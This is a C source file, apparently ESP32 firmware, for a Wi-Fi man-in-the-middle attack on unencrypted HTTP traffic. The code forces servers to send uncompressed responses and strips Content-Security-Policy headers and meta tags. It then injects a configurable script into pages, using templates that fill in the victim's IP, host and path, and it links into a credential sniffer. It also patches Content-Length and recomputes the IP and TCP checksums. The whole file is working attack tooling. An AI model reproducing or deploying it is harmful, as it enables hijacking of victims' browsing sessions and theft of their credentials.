#include "wlan_html_inject.h"
#include "wlan_cred_sniff.h"

#include <esp_log.h>
#include <stdio.h>
#include <string.h>

#define TAG "WlanHtmlInject"

#define ETH_HDR_LEN 14
#define ETHTYPE_IPV4 0x0800
#define IPPROTO_TCP 6

#define INJECT_CODE_MAX 256
#define INJECT_DEFAULT "<script>alert(1234);</script>"

// Length-preserving Replacement für outbound Accept-Encoding-Header:
// "Accept-Encoding: identity" — Server antwortet dann unkomprimiert.
#define AE_REPLACEMENT "Accept-Encoding: identity"
#define AE_REPLACEMENT_LEN 25

static volatile bool s_armed = false;
static volatile uint32_t s_injected = 0;
static volatile uint32_t s_stripped = 0;

// Inject-Payload (dynamisch setzbar via wlan_html_inject_set_code).
// Producer im lwIP-tcpip_thread liest s_inject_code_len (atomic acquire) und
// dann s_inject_code[0..len) — der UI-Thread schreibt erst den Buffer, dann
// release-stored die Länge. Innerhalb einer Run-Session wird der Code nie
// geändert, daher reicht das ohne weitere Synchronisation.
static char s_inject_code[INJECT_CODE_MAX] = INJECT_DEFAULT;
static volatile uint32_t s_inject_code_len = sizeof(INJECT_DEFAULT) - 1;
static volatile uint32_t s_my_ip = 0;

// Render-Scratch — wird im lwIP-tcpip_thread genutzt (single producer),
// daher kein Lock. Vor jedem Inject wird das Template hier aufgelöst.
#define INJECT_RENDERED_MAX 512
static char s_rendered[INJECT_RENDERED_MAX];

static struct WlanCredSniff* s_cred_sniff = NULL;

void wlan_html_inject_set_armed(bool armed) {
    __atomic_store_n(&s_armed, armed, __ATOMIC_RELEASE);
    if(armed) {
        __atomic_store_n(&s_injected, 0u, __ATOMIC_RELAXED);
        __atomic_store_n(&s_stripped, 0u, __ATOMIC_RELAXED);
    }
}

bool wlan_html_inject_armed(void) {
    return __atomic_load_n(&s_armed, __ATOMIC_RELAXED);
}

void wlan_html_inject_set_code(const char* code) {
    if(!code) return;
    uint32_t l = (uint32_t)strlen(code);
    if(l == 0) return;
    if(l > INJECT_CODE_MAX) l = INJECT_CODE_MAX;
    memcpy(s_inject_code, code, l);
    __atomic_store_n(&s_inject_code_len, l, __ATOMIC_RELEASE);
}

void wlan_html_inject_set_cred_sniff(struct WlanCredSniff* cs) {
    s_cred_sniff = cs;
}

void wlan_html_inject_set_my_ip(uint32_t ip) {
    __atomic_store_n(&s_my_ip, ip, __ATOMIC_RELEASE);
}

uint32_t wlan_html_inject_count_injected(void) {
    return __atomic_load_n(&s_injected, __ATOMIC_RELAXED);
}

uint32_t wlan_html_inject_count_stripped(void) {
    return __atomic_load_n(&s_stripped, __ATOMIC_RELAXED);
}

// ---------------------------------------------------------------------------
// kleine Parse-Helfer (case-insensitive)
// ---------------------------------------------------------------------------

static inline bool is_html_ws(uint8_t c) {
    return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

static bool ci_match(const uint8_t* a, const char* b, int n) {
    for(int i = 0; i < n; i++) {
        char x = (char)a[i];
        char y = b[i];
        if(x >= 'A' && x <= 'Z') x = (char)(x + 32);
        if(y >= 'A' && y <= 'Z') y = (char)(y + 32);
        if(x != y) return false;
    }
    return true;
}

static const uint8_t* ci_mem_find(const uint8_t* hay, int haylen, const char* needle) {
    int nlen = (int)strlen(needle);
    if(nlen <= 0 || haylen < nlen) return NULL;
    for(int i = 0; i + nlen <= haylen; i++)
        if(ci_match(hay + i, needle, nlen)) return hay + i;
    return NULL;
}

// ---------------------------------------------------------------------------
// Checksums (IP-Header + TCP). IP-Header und TCP-Header sind beim Inject
// betroffen: Total-Length wächst um INJECT_SCRIPT_LEN, daher beide neu.
// ---------------------------------------------------------------------------

static uint16_t one_complement_finalize(uint32_t sum) {
    while(sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

static void recompute_ip_csum(uint8_t* ip_hdr) {
    int ihl = (ip_hdr[0] & 0x0f) * 4;
    ip_hdr[10] = 0;
    ip_hdr[11] = 0;
    uint32_t sum = 0;
    for(int i = 0; i + 1 < ihl; i += 2)
        sum += ((uint16_t)ip_hdr[i] << 8) | ip_hdr[i + 1];
    uint16_t cs = one_complement_finalize(sum);
    ip_hdr[10] = (uint8_t)(cs >> 8);
    ip_hdr[11] = (uint8_t)(cs & 0xff);
}

static void recompute_tcp_csum(uint8_t* ip_hdr, int ip_total_len) {
    int ihl = (ip_hdr[0] & 0x0f) * 4;
    uint8_t* tcp = ip_hdr + ihl;
    int tcp_len = ip_total_len - ihl;
    if(tcp_len < 20) return;

    uint32_t sum = 0;
    // Pseudo-Header: src_ip (4B), dst_ip (4B).
    for(int i = 12; i < 20; i += 2)
        sum += ((uint16_t)ip_hdr[i] << 8) | ip_hdr[i + 1];
    sum += ip_hdr[9]; // 0x00 | proto = 0x0006 für TCP
    sum += (uint16_t)tcp_len;

    tcp[16] = 0;
    tcp[17] = 0;
    for(int i = 0; i + 1 < tcp_len; i += 2)
        sum += ((uint16_t)tcp[i] << 8) | tcp[i + 1];
    if(tcp_len & 1) sum += (uint16_t)tcp[tcp_len - 1] << 8;

    uint16_t cs = one_complement_finalize(sum);
    tcp[16] = (uint8_t)(cs >> 8);
    tcp[17] = (uint8_t)(cs & 0xff);
}

// ---------------------------------------------------------------------------
// Accept-Encoding strip (outbound, length-preserving).
// ---------------------------------------------------------------------------

static bool strip_accept_encoding(uint8_t* data, int data_len) {
    const uint8_t* ae = ci_mem_find(data, data_len, "accept-encoding:");
    if(!ae) return false;
    int off = (int)(ae - data);
    int end = off;
    while(end < data_len && data[end] != '\r' && data[end] != '\n') end++;
    int line_len = end - off;
    if(line_len < AE_REPLACEMENT_LEN) return false;
    memcpy(data + off, AE_REPLACEMENT, AE_REPLACEMENT_LEN);
    for(int i = off + AE_REPLACEMENT_LEN; i < end; i++) data[i] = ' ';
    return true;
}

// ---------------------------------------------------------------------------
// CSP strip (inbound, length-preserving). Wir benennen jedes Vorkommen von
// "Content-Security-Policy[-Report-Only]" um — deckt sowohl den HTTP-Response-
// Header als auch <meta http-equiv="Content-Security-Policy" ...> im Body ab.
// Der Browser ignoriert den umbenannten Header / unbekanntes meta-Attribut.
// ---------------------------------------------------------------------------

static bool strip_csp(uint8_t* data, int data_len) {
    // Längeren Namen zuerst — sonst matcht "Content-Security-Policy" auch als
    // Substring von "Content-Security-Policy-Report-Only" und maskiert ihn.
    static const struct {
        const char* needle;
        const char* replace;
    } csps[] = {
        {"Content-Security-Policy-Report-Only", "X-Csp-Stripped---------------------"},
        {"Content-Security-Policy", "X-Csp-Stripped---------"},
    };
    bool any = false;
    for(unsigned n = 0; n < sizeof(csps) / sizeof(csps[0]); n++) {
        int nlen = (int)strlen(csps[n].needle);
        int rlen = (int)strlen(csps[n].replace);
        if(rlen != nlen) continue; // Programmierfehler
        int from = 0;
        while(from + nlen <= data_len) {
            const uint8_t* found = ci_mem_find(data + from, data_len - from, csps[n].needle);
            if(!found) break;
            int off = (int)(found - data);
            memcpy(data + off, csps[n].replace, rlen);
            any = true;
            from = off + nlen;
        }
    }
    return any;
}

// ---------------------------------------------------------------------------
// Content-Length parsen / length-preserving aktualisieren.
// Der Wert wird zwischen ":" und "\r\n" in einem Feld bekannter Länge
// geschrieben — Padding mit führenden Spaces (HTTP OWS), damit die
// Header-Block-Größe konstant bleibt.
// ---------------------------------------------------------------------------

static bool find_content_length(
    uint8_t* data,
    int header_block_len,
    int* out_value_field_off,
    int* out_value_field_len,
    uint32_t* out_value) {
    const uint8_t* cl = ci_mem_find(data, header_block_len, "Content-Length:");
    if(!cl) return false;
    int after_colon = (int)(cl - data) + 15;
    int end = after_colon;
    while(end < header_block_len && data[end] != '\r' && data[end] != '\n') end++;
    int p = after_colon;
    while(p < end && (data[p] == ' ' || data[p] == '\t')) p++;
    if(p == end || data[p] < '0' || data[p] > '9') return false;
    uint32_t val = 0;
    while(p < end && data[p] >= '0' && data[p] <= '9') {
        val = val * 10 + (uint32_t)(data[p] - '0');
        p++;
    }
    *out_value_field_off = after_colon;
    *out_value_field_len = end - after_colon;
    *out_value = val;
    return true;
}

static bool write_content_length(uint8_t* data, int field_off, int field_len, uint32_t new_val) {
    char buf[16];
    int n = snprintf(buf, sizeof(buf), "%u", (unsigned)new_val);
    if(n <= 0 || n > field_len) return false;
    int pad = field_len - n;
    for(int i = 0; i < pad; i++) data[field_off + i] = ' ';
    memcpy(data + field_off + pad, buf, (size_t)n);
    return true;
}

// ---------------------------------------------------------------------------
// Template-Render: %%VAR%%-Platzhalter im Inject-Code durch konkrete Werte
// ersetzen. Out-Buffer wird beschrieben, Anzahl geschriebener Bytes
// zurückgegeben (nicht NUL-terminiert — Caller arbeitet mit Länge).
// Unbekannte oder kaputt geschriebene %%...%% bleiben unverändert im Output.
// ---------------------------------------------------------------------------

static int append_ip(char* out, int out_max, int o, uint32_t ip) {
    const uint8_t* b = (const uint8_t*)&ip;
    char buf[16];
    int n = snprintf(buf, sizeof(buf), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
    if(n <= 0) return o;
    if(o + n > out_max) n = out_max - o;
    if(n > 0) {
        memcpy(out + o, buf, (size_t)n);
        o += n;
    }
    return o;
}

static int append_str(char* out, int out_max, int o, const char* s) {
    if(!s) return o;
    int n = (int)strlen(s);
    if(o + n > out_max) n = out_max - o;
    if(n > 0) {
        memcpy(out + o, s, (size_t)n);
        o += n;
    }
    return o;
}

static int render_template(
    char* out, int out_max,
    const char* tmpl, int tmpl_len,
    uint32_t victim_ip, const char* host, const char* path) {
    uint32_t my_ip = __atomic_load_n(&s_my_ip, __ATOMIC_ACQUIRE);
    int o = 0;
    int i = 0;
    while(i < tmpl_len && o < out_max) {
        // %%VAR%% erkennen
        if(i + 4 <= tmpl_len && tmpl[i] == '%' && tmpl[i + 1] == '%') {
            const char* var_start = tmpl + i + 2;
            int max_var_len = tmpl_len - i - 2 - 1; // -1 für das schließende %%
            int var_len = -1;
            for(int j = 0; j + 1 < max_var_len + 1; j++) {
                if(var_start[j] == '%' && var_start[j + 1] == '%') {
                    var_len = j;
                    break;
                }
            }
            if(var_len > 0) {
                int prev_o = o;
                if(var_len == 5 && memcmp(var_start, "MY_IP", 5) == 0) {
                    o = append_ip(out, out_max, o, my_ip);
                } else if(var_len == 9 && memcmp(var_start, "VICTIM_IP", 9) == 0) {
                    o = append_ip(out, out_max, o, victim_ip);
                } else if(var_len == 4 && memcmp(var_start, "HOST", 4) == 0) {
                    o = append_str(out, out_max, o, host);
                } else if(var_len == 4 && memcmp(var_start, "PATH", 4) == 0) {
                    o = append_str(out, out_max, o, path);
                } else {
                    // Unbekannte Variable — wörtlich übernehmen
                    if(o < out_max) out[o++] = tmpl[i];
                    i++;
                    continue;
                }
                // (auch wenn Output durch Cap unverändert blieb, Variable konsumieren)
                (void)prev_o;
                i += 2 + var_len + 2; // "%%VAR%%"
                continue;
            }
        }
        out[o++] = tmpl[i++];
    }
    return o;
}

// ---------------------------------------------------------------------------
// Length-preserving Fallback: ersten <meta...>-Tag (mit ausreichend
// umliegendem Whitespace) durch INJECT_SCRIPT + Space-Padding ersetzen.
// Funktioniert auch in Folge-Paketen einer multi-segment-Response, weil sich
// die TCP-Payload-Länge nicht ändert. Iteriert über alle <meta>-Tags bis
// einer mit Span >= INJECT_SCRIPT_LEN gefunden wird.
// ---------------------------------------------------------------------------

// Sucht nach den ersten <meta>-Tag und ersetzt ihn length-preserving durch
// den Inject-Code. Wenn der Span (Tag + direkt umliegende Whitespaces) zu
// klein ist, wird gierig Whitespace aus nachfolgenden ">\s+<"-Lücken
// "gestohlen": der HTML-Inhalt zwischen dem Span und der Whitespace-Lücke
// wird per memmove nach rechts geschoben, die führenden Whitespace-Bytes der
// Lücke überschrieben. Effektiv: <meta> + folgender Tag rücken zusammen,
// dazwischen wird Platz frei. Browser sehen am Ende dasselbe HTML mit
// weniger Whitespace zwischen einigen Tags — semantisch egal.
static bool replace_meta_with_script(
    uint8_t* data, int data_len, const char* code, int icl) {
    if(icl <= 0) return false;

    int from = 0;
    while(from < data_len) {
        const uint8_t* tag = ci_mem_find(data + from, data_len - from, "<meta");
        if(!tag) return false;
        int tag_off = (int)(tag - data);
        int close = -1;
        for(int i = tag_off + 5; i < data_len; i++) {
            if(data[i] == '>') {
                close = i;
                break;
            }
            if(data[i] == '<') break;
        }
        if(close < 0) {
            from = tag_off + 5;
            continue;
        }

        // Phase 1: Span = <meta...> mit direkt umliegenden Whitespaces.
        int span_start = tag_off;
        int span_end = close + 1;
        while(span_start > 0 && is_html_ws(data[span_start - 1]) &&
              (span_end - span_start) < icl) {
            span_start--;
        }
        while(span_end < data_len && is_html_ws(data[span_end]) &&
              (span_end - span_start) < icl) {
            span_end++;
        }

        // Phase 2: noch zu wenig — fresse Whitespaces aus nachfolgenden
        // ">\s+<"-Lücken im selben Paket, indem der Inhalt dazwischen per
        // memmove nach rechts geschoben wird. safety verhindert Endlos-Loops
        // bei pathologischem HTML.
        int safety = 32;
        while((span_end - span_start) < icl && safety-- > 0) {
            // Nächstes '>' (Ende des nächsten Tags) suchen.
            int gt_pos = -1;
            for(int i = span_end; i < data_len; i++) {
                if(data[i] == '>') {
                    gt_pos = i;
                    break;
                }
            }
            if(gt_pos < 0) break;

            // Whitespace-Region direkt nach '>' bis vor das nächste '<'.
            int ws_start = gt_pos + 1;
            int ws_end = ws_start;
            while(ws_end < data_len && is_html_ws(data[ws_end])) ws_end++;
            // Muss von '<' beendet sein (sonst ist's Text-Content, den wir
            // nicht mitten in einem Wort kürzen wollen).
            if(ws_end >= data_len || data[ws_end] != '<') break;
            int ws_len = ws_end - ws_start;
            if(ws_len == 0) break; // direkt aneinandergrenzende Tags — kein Whitespace zu holen

            int needed = icl - (span_end - span_start);
            int take = (ws_len < needed) ? ws_len : needed;

            // Verschiebe Inhalt zwischen span_end und ws_start nach rechts um
            // `take` Bytes. Die ersten `take` Bytes der Whitespace-Region
            // werden dadurch überschrieben — genau das wollen wir. Die
            // [span_end .. span_end+take) Bytes sind danach "frei" und
            // werden gleich mit Script-Inhalt überschrieben.
            int between_len = ws_start - span_end;
            memmove(data + span_end + take, data + span_end, (size_t)between_len);
            span_end += take;
        }

        if((span_end - span_start) >= icl) {
            memcpy(data + span_start, code, (size_t)icl);
            for(int i = span_start + icl; i < span_end; i++) data[i] = ' ';
            return true;
        }
        from = close + 1;
    }
    return false;
}

// ---------------------------------------------------------------------------
// Inject am <body>-Anfang. Vergrössert den TCP-Payload um INJECT_SCRIPT_LEN
// Bytes. Liefert den tatsächlichen Wachstum oder 0 wenn kein Inject erfolgte.
// max_growth = Headroom im Ethernet-Buffer (>= INJECT_SCRIPT_LEN nötig).
// ---------------------------------------------------------------------------

// data muss ein HTTP-Response-Start-Paket sein (Payload beginnt mit "HTTP/").
// Caller stellt das sicher, daher kein redundanter Check.
static int inject_into_body(
    uint8_t* data, int data_len, int max_growth, const char* code, int icl) {
    if(icl <= 0) return 0;
    if(max_growth < icl) return 0;

    const uint8_t* hdr_end_p = ci_mem_find(data, data_len, "\r\n\r\n");
    if(!hdr_end_p) return 0;
    int header_block_len = (int)(hdr_end_p - data);
    int body_off = header_block_len + 4;
    int body_avail = data_len - body_off;
    if(body_avail <= 0) return 0;

    int cl_off, cl_field_len;
    uint32_t cl_value;
    if(!find_content_length(data, header_block_len, &cl_off, &cl_field_len, &cl_value)) return 0;
    if(cl_value > (uint32_t)body_avail) return 0; // multi-segment → meta-replace fallback

    const uint8_t* body_tag = ci_mem_find(data + body_off, body_avail, "<body");
    if(!body_tag) return 0;
    int btag_off = (int)(body_tag - data);
    int max_search = btag_off + 256;
    if(max_search > data_len) max_search = data_len;
    int btag_close = -1;
    for(int i = btag_off + 5; i < max_search; i++) {
        if(data[i] == '>') {
            btag_close = i;
            break;
        }
        if(data[i] == '<') return 0;
    }
    if(btag_close < 0) return 0;
    int inject_pos = btag_close + 1;

    if(!write_content_length(data, cl_off, cl_field_len, cl_value + (uint32_t)icl)) return 0;

    int tail = data_len - inject_pos;
    memmove(data + inject_pos + icl, data + inject_pos, (size_t)tail);
    memcpy(data + inject_pos, code, (size_t)icl);
    return icl;
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------

bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_size) {
    if(!wlan_html_inject_armed()) return false;
    if(!eth || !len_ptr) return false;
    uint16_t len = *len_ptr;
    if(len < ETH_HDR_LEN + 20 + 20) return false;

    uint16_t ethertype = ((uint16_t)eth[12] << 8) | eth[13];
    if(ethertype != ETHTYPE_IPV4) return false;

    uint8_t* ip = eth + ETH_HDR_LEN;
    int ip_avail = (int)len - ETH_HDR_LEN;
    if((ip[0] >> 4) != 4) return false;
    int ihl = (ip[0] & 0x0f) * 4;
    if(ihl < 20 || ihl > ip_avail) return false;
    int ip_total = ((int)ip[2] << 8) | ip[3];
    if(ip_total < ihl) return false;
    if(ip_total > ip_avail) ip_total = ip_avail;
    if(ip[9] != IPPROTO_TCP) return false;

    uint8_t* tcp = ip + ihl;
    int tcp_len = ip_total - ihl;
    if(tcp_len < 20) return false;
    int doff = ((tcp[12] >> 4) & 0x0f) * 4;
    if(doff < 20 || doff > tcp_len) return false;
    uint8_t* data = tcp + doff;
    int data_len = tcp_len - doff;
    if(data_len <= 0) return false;

    uint16_t sport = ((uint16_t)tcp[0] << 8) | tcp[1];
    uint16_t dport = ((uint16_t)tcp[2] << 8) | tcp[3];

    bool to_server = (dport == 80 || dport == 8080 || dport == 8000);
    bool from_server = (sport == 80 || sport == 8080 || sport == 8000);

    bool modified = false;
    int growth = 0;

    if(to_server) {
        if(strip_accept_encoding(data, data_len)) {
            __atomic_fetch_add(&s_stripped, 1u, __ATOMIC_RELAXED);
            modified = true;
        }
    } else if(from_server) {
        // Template rendern: Inject-Code mit %%MY_IP%%, %%VICTIM_IP%%, %%HOST%%,
        // %%PATH%% vorbereiten. Lookup im Cred-Sniff-Tracker für Host/Path.
        uint32_t src_ip, dst_ip;
        memcpy(&src_ip, ip + 12, 4);
        memcpy(&dst_ip, ip + 16, 4);
        char host_buf[WLAN_CRED_STR_MAX] = {0};
        char path_buf[WLAN_CRED_STR_MAX] = {0};
        if(s_cred_sniff) {
            wlan_cred_sniff_lookup_http_url(
                s_cred_sniff, src_ip, dport,
                host_buf, sizeof(host_buf), path_buf, sizeof(path_buf));
        }
        uint32_t tmpl_len = __atomic_load_n(&s_inject_code_len, __ATOMIC_ACQUIRE);
        int rendered_len = 0;
        if(tmpl_len > 0) {
            rendered_len = render_template(
                s_rendered, INJECT_RENDERED_MAX,
                s_inject_code, (int)tmpl_len,
                dst_ip, host_buf, path_buf);
        }

        bool injected_now = false;
        // CSP-Strip + body-Inject sind nur auf dem Response-Start-Paket
        // sinnvoll. Folge-Pakete enthalten weder Header noch <body>.
        bool is_response_start = (data_len >= 5 && memcmp(data, "HTTP/", 5) == 0);
        if(is_response_start) {
            if(strip_csp(data, data_len)) {
                __atomic_fetch_add(&s_stripped, 1u, __ATOMIC_RELAXED);
                modified = true;
            }
            int headroom = (int)buf_size - (int)len;
            int g = inject_into_body(data, data_len, headroom, s_rendered, rendered_len);
            if(g > 0) {
                growth = g;
                data_len += g;
                uint32_t n = __atomic_add_fetch(&s_injected, 1u, __ATOMIC_RELAXED);
                if((n & 0x1f) == 1) // jeden 32. loggen
                    ESP_LOGI(TAG, "INJECT #%lu (+%dB len=%u)",
                        (unsigned long)n, g, (unsigned)(len + g));
                modified = true;
                injected_now = true;
            }
        }
        // Meta-Replace-Fallback (length-preserving). memchr-Vorprüfung spart
        // den teuren ci_mem_find auf Paketen ohne '<' (z.B. Binär-Streams,
        // Bilder, JS-Files ohne HTML).
        if(growth == 0 && rendered_len > 0 && memchr(data, '<', (size_t)data_len) != NULL) {
            if(replace_meta_with_script(data, data_len, s_rendered, rendered_len)) {
                uint32_t n = __atomic_add_fetch(&s_injected, 1u, __ATOMIC_RELAXED);
                if((n & 0x1f) == 1)
                    ESP_LOGI(TAG, "META-REPLACE #%lu (dlen=%d)", (unsigned long)n, data_len);
                modified = true;
                injected_now = true;
            }
        }
        if(injected_now && s_cred_sniff) {
            wlan_cred_sniff_push_inject(s_cred_sniff, src_ip, dst_ip, dport);
        }
    }

    if(!modified) return false;

    // IP-Total-Length aktualisieren falls gewachsen, dann Checksums neu.
    if(growth > 0) {
        ip_total += growth;
        tcp_len += growth;
        ip[2] = (uint8_t)(ip_total >> 8);
        ip[3] = (uint8_t)(ip_total & 0xff);
        recompute_ip_csum(ip);
        *len_ptr = (uint16_t)(len + growth);
    }
    recompute_tcp_csum(ip, ip_total);
    return true;
}
